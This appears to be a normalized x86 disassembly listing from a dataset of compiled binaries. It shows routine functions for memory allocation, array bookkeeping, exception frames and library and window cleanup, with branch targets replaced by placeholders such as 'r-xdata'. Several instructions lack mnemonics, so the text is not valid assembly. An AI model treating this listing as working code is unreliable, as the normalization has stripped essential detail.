je r-xdata
cmp al 0x14
je r-xdata
mov [ esp + 0x34 ] 0x18
jmp r-xdata
mov eax [ esp + 0x10 ]
add eax 0x3
cmp eax 0x18
jne r-xdata
mov [ esp + 0x34 ] 0x20
mov eax [ esi + 0x14 ]
cmp eax ecx
jne r-xdata
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
push ecx
mov ecx eax
call sub_40ac10
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x28 ]
call sub_40b730
push 0x10
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov edx eax
and edx 0xa0000008
cmp edx 0xa0000008
je r-xdata
mov [ esp + 0x34 ] 0x8
jmp r-xdata
xor eax eax
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push edx
lea edx [ edi + ecx ]
mov ecx [ esp + 0x18 ]
push edx
lea edx [ edi + ecx ]
mov ecx [ esp + 0x18 ]
push edx
push ebx
push ebp
push esi
push edi
push ecx
mov ecx eax
call sub_40ac50
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov ecx [ edx ]
and ecx eax
sub edi ecx
push 0x24
and edi eax
call j_sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov ebx [ esi + 0x4 ]
mov ebp [ esi ]
lea eax [ edi - 0x1 ]
mov [ esp + 0x18 ] eax
not eax
mov ecx ebx
and ecx 0x1
lea esi [ edi + ebp - 0x1 ]
and esi eax
lea eax [ ecx + ebx ]
mov [ esp + 0x10 ] eax
imul eax esi
mov [ esp + 0x14 ] eax
mov eax esi
cdq
sub eax edx
mov edx [ esp + 0x14 ]
sar eax 0x1
add eax edx
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
cdq
sub eax edx
sar eax 0x1
add eax ecx
add eax ebx
imul eax esi
mov [ esp + 0x34 ] 0xc
mov [ esp + 0x1c ] esi
lea eax [ eax + edi - 0x1 ]
jmp r-xdata
mov edx eax
and edx 0xa0000010
cmp edx 0xa0000010
jne r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov [ ecx ] eax
mov eax ecx
pop ebx
add esp 0x14
retn 0x10
inc [ eax ]
test eax eax
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x34 ]
mov [ ecx + 0x8 ] edx
mov edx [ esp + 0x30 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov edx [ edx ]
mov [ ecx + 0xc ] edx
je r-xdata
mov [ esp + 0x10 ] eax
mov edx eax
and edx 0x60000004
cmp edx 0x60000004
jne r-xdata
mov edx eax
and edx 0x50000001
cmp edx 0x50000001
jne r-xdata
mov [ esp + 0x34 ] 0x10
jmp r-xdata
and eax 0x50000002
cmp eax 0x50000002
je r-xdata
mov [ esp + 0x34 ] 0x18
jmp r-xdata
mov eax [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov [ eax ] ecx
pop ebx
add esp 0x14
retn 0x10
sub_4162b0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push ecx
mov ecx [ esp + 0x14 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_4162e0
add esp 0x10
retn 0xc
sub_4162e0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_453050
add esp 0x14
retn
sub_416310
sub esp 0x44
push ebx
push ebp
push esi
mov esi [ esp + 0x54 ]
mov ecx [ esi + 0x38 ]
push edi
xor ebp ebp
xor ebx ebx
lea edi [ esi + 0x34 ]
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
mov ecx [ edi + 0x4 ]
cmp ecx ebp
mov [ esp + 0x10 ] ebx
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp ebx eax
jae r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x38 ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
cmp eax ebp
je r-xdata
mov ebp [ esp + 0x5c ]
xor esi esi
lea ecx [ ecx ]
mov ecx [ edi + 0x4 ]
cmp ecx ebp
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0xc ] ebp
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp esi eax
jae r-xdata
push 0x10
call sub_4b573e
add esp 0x4
cmp eax ebp
je r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp eax 0x64
jbe r-xdata
inc ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
sar edi 0x2
xor edi edi
jmp r-xdata
mov ecx [ ebp ]
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x58 ]
mov ebx [ edx ]
mov edx [ eax + 0x38 ]
mov eax [ edx + esi * 4 ]
mov eax [ eax ]
test eax eax
jne r-xdata
xor eax eax
mov [ eax ] ebp
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
mov [ eax + 0xc ] ebp
jmp r-xdata
mov eax [ esi ]
push 0x64
push r--data
push esi
call [ eax + 0x14 ]
add esp 0xc
cmp ecx ebp
je r-xdata
mov eax [ edi + 0x38 ]
mov edx [ eax + esi * 4 ]
mov cl [ edx + 0x4 ]
test cl cl
mov ecx [ ebp ]
je r-xdata
mov ecx [ edi ]
push r--data
push edi
call [ ecx + 0x14 ]
add esp 0x8
cmp esi edi
mov edi [ esp + 0x58 ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov edx [ edx ]
add edx [ eax + 0x8 ]
xor edx edx
jmp r-xdata
mov edx [ edi + 0x4 ]
cmp edx ebp
jne r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx ebp
jne r-xdata
cmp eax ebp
mov [ esp + 0x18 ] eax
jne r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ecx + 0x4 ]
mov edi [ ecx + 0x8 ]
mov ebx [ eax ]
mov edx eax
add ebx edi
mov edi [ edx ]
push 0x2
call sub_4167c0
mov ecx [ ebp ]
add eax edi
mov [ esp + 0x14 ] eax
mov eax [ ecx + 0x4 ]
mov edi [ eax ]
push 0x4
call sub_4167c0
add eax edi
mov [ esp + 0x18 ] eax
mov eax [ ebp ]
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x20 ]
xor eax eax
mov [ esp + 0x20 ] ecx
mov ecx 0xc
lea edi [ esp + 0x24 ]
[ edi ]
mov eax [ esp + 0x58 ]
mov ecx [ eax + 0x38 ]
mov eax [ ecx + esi * 4 ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x24 ] edx
mov edx [ eax ]
mov eax [ eax + 0x8 ]
mov edx [ edx + 0x14 ]
add eax 0xfffffff8
cmp eax 0x18
mov [ esp + 0x28 ] edx
mov esi 0x60000004
ja r-xdata
inc esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
add eax ebx
cmp eax edx
mov ebx [ esp + 0x10 ]
je r-xdata
mov ecx [ edi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ eax + esi * 4 ]
mov eax [ eax + ebx * 4 ]
push ecx
lea edx [ esp + 0x5c ]
push edx
push eax
call sub_416860
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0xc ] 0x1
jne r-xdata
push 0x10
lea edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x18 ]
lea eax [ esp + 0x60 ]
push eax
mov eax [ ecx + edx * 4 ]
push eax
call sub_416060
mov eax [ eax ]
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_416798 ]
jmp [ eax * 4 + jump_table_416780 ]
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx edi
call sub_418070
mov eax [ edi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
cmp edx ebp
je r-xdata
mov ecx [ esi ]
push eax
push r--data
push esi
call [ ecx + 0x14 ]
add esp 0xc
mov ecx [ ebp ]
test ecx ecx
je r-xdata
inc [ eax ]
mov al 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn 0x8
mov ecx [ ebp ]
test ecx ecx
je r-xdata
inc [ eax ]
mov [ esp + 0x38 ] 0x0
jmp r-xdata
mov [ esp + 0x38 ] 0xa0000008
jmp r-xdata
mov [ esp + 0x38 ] esi
jmp r-xdata
mov [ esp + 0x38 ] 0x50000001
jmp r-xdata
mov [ esp + 0x38 ] 0x50000002
mov esi [ edi + 0x8 ]
push edi
lea edx [ esp + 0x1c ]
push edx
push 0x1
push esi
call sub_416930
add esp 0x10
add esi 0x4
mov [ edi + 0x8 ] esi
jmp r-xdata
mov [ ebp ] eax
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov [ ebp ] eax
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x44
retn 0x8
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
mov ecx [ ebp ]
call sub_4167e0
mov ecx [ ebp ]
mov edx [ ecx + 0xc ]
mov ecx [ ecx + 0x10 ]
mov [ esp + 0x58 ] edx
cmp [ esp + 0x38 ] esi
mov [ esp + 0x5c ] ecx
jne r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
mov esi [ esp + 0x28 ]
test esi esi
jle r-xdata
add ecx 0x3
and ecx 0xfffffffc
mov [ esp + 0x5c ] ecx
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
cmp [ esp + 0x38 ] 0xa0000008
jne r-xdata
mov [ esp + 0x10 ] esi
jmp r-xdata
mov ecx [ ebp ]
push 0x2
call sub_416800
mov [ esp + 0x5c ] eax
mov eax [ ebp ]
mov ecx [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
inc eax
cdq
sub eax edx
mov ebx eax
lea eax [ esi + 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
sar ebx 0x1
test esi esi
mov [ esp + 0x58 ] ecx
mov [ esp + 0x20 ] esi
jle r-xdata
mov edx ecx
shr ecx 0x2
mov esi ebx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x58 ]
mov ecx [ esp + 0x10 ]
add eax esi
add ebx edx
dec ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ecx [ ebp ]
push 0x4
call sub_416800
mov ebx eax
mov eax [ ebp ]
mov ebp [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
inc eax
cdq
sub eax edx
sar eax 0x1
test esi esi
jle r-xdata
mov eax esi
mov ecx [ esp + 0x5c ]
mov esi [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x5c ]
mov ecx ebx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x5c ]
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x58 ]
add edi ecx
add esi edx
dec eax
mov [ esp + 0x5c ] edi
mov [ esp + 0x14 ] esi
jne r-xdata
mov esi [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
mov edi ebx
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
add edx ecx
mov ecx [ esp + 0x58 ]
add ebx ebp
dec ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x58 ] ecx
jne r-xdata
xor al al
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn 0x8
sub_416800
mov eax [ esp + 0x4 ]
cmp eax 0x1
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x18 ]
mov eax [ eax ]
add eax edx
retn 0x4
sub eax 0x2
je r-xdata
xor eax eax
retn 0x4
mov eax [ ecx + 0x4 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x1c ]
mov eax [ eax ]
add eax edx
retn 0x4
mov eax [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ eax ]
add eax edx
retn 0x4
inc [ eax + 0x8 ]
mov eax [ eax ]
mov ecx [ ecx + 0x8 ]
add eax ecx
retn 0x4
sub_416860
sub esp 0x8
push ebp
mov ebp [ esp + 0x10 ]
push edi
xor edi edi
mov ecx ebp
mov [ esp + 0xc ] edi
call sub_40b730
push 0x10
call sub_4b573e
add esp 0x4
cmp eax edi
je r-xdata
push ebx
mov ebx [ esp + 0x20 ]
push esi
mov esi [ ebx ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
push 0x24
mov [ edi + 0x4 ] eax
call j_sub_4b573e
add esp 0x4
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx eax
call sub_40ac00
mov edi eax
xor eax eax
mov edx [ esi + 0x20 ]
mov ebx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
mov ebp [ esi + 0x10 ]
mov ecx [ esi + 0x14 ]
push edx
push ebx
push eax
push ecx
mov [ esp + 0x20 ] ebp
mov ecx [ esp + 0x20 ]
mov ebp [ esi + 0xc ]
mov esi [ esi + 0x8 ]
push ecx
mov ecx [ esp + 0x28 ]
push ebp
push esi
push edi
call sub_40ac50
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x18 ]
pop edi
mov [ eax ] ebp
pop ebp
add esp 0x8
retn 0xc
inc [ ebp ]
mov [ ebp ] eax
mov dl [ ebx + 0x4 ]
mov [ ebp + 0x4 ] dl
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x4 ] 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0xc ]
mov [ ebp + 0xc ] ecx
mov ebp [ ebp ]
test ebp ebp
pop esi
pop ebx
je r-xdata
sub_416930
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_420d80
add esp 0x18
retn
sub_416960
push 0xffffffff
push sub_4beeb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov edx [ esp + 0x30 ]
mov eax edx
push esi
mov [ esp + 0x1c ] 0xf
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x8 ] 0x0
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0xc ]
call sub_401e80
mov esi [ esp + 0x30 ]
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] 0x0
call sub_407460
cmp [ esp + 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax - 0x4 ]
sub eax 0x1c
cmp ecx 0x10
pop esi
jb r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x1c ]
add eax 0x4
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0xc
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0xc
sub_416a10
push ecx
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov esi ecx
xor ebx ebx
jmp r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx ebp
je r-xdata
mov eax [ esi + 0x38 ]
cmp eax ebp
je r-xdata
mov eax [ esi + 0x3c ]
sub eax ecx
sar eax 0x2
cmp ebx eax
jae r-xdata
lea edi [ esi + 0x4 ]
mov [ esi + 0x38 ] ebp
mov [ esi + 0x3c ] ebp
mov [ esi + 0x40 ] ebp
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax ecx
mov edi [ eax + ebx * 4 ]
cmp edi ebp
je r-xdata
mov [ edi + 0x4 ] ebp
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov edi [ esi + 0x28 ]
cmp edi ebp
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ edi + 0x8 ]
push ecx
push edi
push edx
push eax
call sub_402270
mov eax [ edi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x14
inc ebx
jmp r-xdata
mov ecx edi
call sub_40b730
push edi
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x28 ] ebp
mov [ esi + 0x2c ] ebp
mov [ esi + 0x30 ] ebp
mov eax [ esi + 0x18 ]
cmp eax ebp
je r-xdata
mov ebx [ esi + 0x2c ]
cmp edi ebx
je r-xdata
pop edi
mov [ esi + 0x18 ] ebp
mov [ esi + 0x1c ] ebp
mov [ esi + 0x20 ] ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x28 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_413c10
add edi 0xa0
cmp edi ebx
jne r-xdata
sub_416b10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bf7d9
push eax
mov [ fs : 0x0 ] esp
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x94 ] ecx
mov [ eax + 0x98 ] 0xf
mov [ eax + 0x84 ] cl
mov ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
sub_416b80
mov eax [ rw-data ]
push ebx
push esi
mov esi [ rw-data ]
cmp esi eax
je r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
push edi
mov edi [ FreeLibrary@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] bl
je r-xdata
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi ]
push eax
call edi
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
mov esi [ rw-data ]
pop edi
pop esi
mov ecx rw-data
pop ebx
jmp sub_416a10
push eax
call [ DestroyWindow@IAT ]
mov [ rw-data ] ebx
sub_416c00
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi ecx
cmp esi ebp
push edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_414f80
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx ebx
mov eax 0x66666667
imul ecx
mov eax [ esp + 0x14 ]
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebp + 0x4 ]
push edx
push ebx
push edi
push eax
call sub_414d00
mov ecx [ esi + 0x8 ]
add esp 0x10
push ecx
push eax
mov ecx esi
call sub_414f50
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
cmp eax edx
ja r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0x14 ]
xor edx edx
jmp r-xdata
mov ebp [ ebp + 0x8 ]
sub ebp eax
mov eax 0x66666667
imul ebp
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esi + 0x4 ]
lea ecx [ edx + edx * 4 ]
shl ecx 0x5
add ecx eax
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edx edx
lea ecx [ edx + edx * 4 ]
shl ecx 0x5
add ecx eax
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
push ebx
call sub_414f50
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx ebp
call sub_40af70
push eax
mov ecx esi
call sub_40cc20
test al al
je r-xdata
call sub_40af70
mov ecx [ esp + 0x14 ]
lea edi [ eax + eax * 4 ]
mov eax [ ebp + 0x4 ]
push ecx
shl edi 0x5
add edi eax
push ebx
push edi
push eax
call sub_414d00
mov edx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov ebp [ ebp + 0x8 ]
push edx
push esi
push eax
push ebp
push edi
call sub_414dd0
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
cmp eax edx
mov ecx esi
ja r-xdata
mov edx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ebp [ ebp + 0x4 ]
push edx
push eax
push ebp
mov ecx esi
call sub_414f00
mov [ esi + 0x8 ] eax
sub_416d90
push ecx
push esi
sub esp 0xa0
mov esi ecx
mov ecx esp
mov [ esp + 0xa4 ] esp
call sub_413b80
mov eax [ esp + 0xac ]
push eax
mov ecx esi
call sub_4153d0
pop esi
pop ecx
retn 0x4
sub_416dc0
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_4154c0
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_414e70
add esp 0x14
add edi 0xa0
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_416e50
push 0xffffffff
push sub_4bf832
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebx
push ebp
push esi
mov esi [ esp + 0x13c ]
mov edx [ esi + 0x28 ]
lea eax [ esi + 0x24 ]
xor ebx ebx
push edi
mov [ esp + 0x18 ] ebx
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] ebx
mov edi edi
lea edx [ esp + 0x14c ]
add esi 0x14
push edx
mov ecx esi
call sub_417fb0
mov ebp [ esp + 0x148 ]
lea ecx [ esp + 0x90 ]
mov [ esp + 0x14 ] ebp
call sub_413b80
mov edi [ esp + 0x144 ]
mov eax edi
mov [ esp + 0x138 ] ebx
lea edx [ eax + 0x1 ]
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp [ esp + 0x18 ] edx
jae r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ esp + 0xa8 ]
call sub_401e80
mov eax [ esi + 0x4 ]
cmp eax ebx
mov [ esp + 0x94 ] bl
mov [ esp + 0x9c ] ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov edi [ esp + 0x144 ]
mov ecx [ esi + 0x28 ]
mov eax edi
lea esi [ ecx + edx + 0x10 ]
lea edx [ eax + 0x1 ]
nop
mov esi [ esi + 0x8 ]
sub esi eax
sar esi 0x2
xor esi esi
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edx [ esi + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ esp + 0x90 ]
push ecx
mov ecx [ esp + 0x28 ]
call sub_416dc0
lea ecx [ esp + 0x90 ]
mov [ esp + 0x138 ] 0xffffffff
call sub_413c10
mov ebp [ esp + 0x14 ]
lea ecx [ ecx ]
mov eax [ esp + 0x150 ]
mov [ esp + 0x12c ] eax
mov al [ ebp ]
dec esi
cmp al bl
mov [ esp + 0x98 ] esi
je r-xdata
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0xc0 ]
call sub_407460
movsx cx [ ebp ]
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x18 ] ecx
lea ecx [ esp + 0xd0 ]
call sub_417280
mov [ esp + 0x1c ] 0x76
mov [ esp + 0x8c ] edi
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
lea ecx [ esp + 0x28 ]
mov [ esp + 0x138 ] 0x3
call sub_417270
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x13c ] 0x4
mov [ esp + 0x2c ] 0x5
call sub_4176b0
lea ecx [ esp + 0x74 ]
push ecx
lea ecx [ esp + 0xf0 ]
call sub_407460
mov eax r--data
mov [ esp + 0x70 ] edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
lea ecx [ eax + 0x1 ]
inc ebp
mov al [ ebp + 0x1 ]
cmp al bl
lea esi [ ebp + 0x1 ]
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x140 ]
mov edx [ esp + 0x14 ]
inc ecx
add eax 0xa0
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x18 ] ecx
jmp r-xdata
xor ecx ecx
cmp edx eax
setne cl
mov ebp ecx
cmp ebp ebx
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x60 ]
call sub_401e80
lea edx [ esp + 0x58 ]
push edx
lea ecx [ esp + 0x100 ]
mov [ esp + 0x13c ] 0x5
call sub_407460
mov eax [ esp + 0x70 ]
mov edi 0x10
cmp eax edi
mov [ esp + 0x138 ] 0x4
jb r-xdata
mov edx esi
sub edx ebp
push edx
push ebp
lea ecx [ esp + 0x44 ]
call sub_401e80
lea ebp [ esi + 0x1 ]
lea ebx [ ebx ]
cmp edx ebx
je r-xdata
mov ecx [ esp + 0x130 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn 0x14
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x13 ]
push ecx
lea ecx [ esp + 0x110 ]
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] bl
mov [ esp + 0x17 ] bl
call sub_417bf0
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x120 ]
call sub_418320
mov esi [ esp + 0x30 ]
inc ebp
cmp esi ebx
je r-xdata
mov eax [ esp + 0x5c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov al [ esi + 0x1 ]
inc esi
cmp al bl
jne r-xdata
cmp al 0x5d
je r-xdata
cmp ebp ebx
jne r-xdata
sbb ebp ebp
sbb ebp 0xffffffff
xor ebp ebp
[ esi ] [ edi ]
je r-xdata
cmp [ esp + 0x8c ] edi
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
jb r-xdata
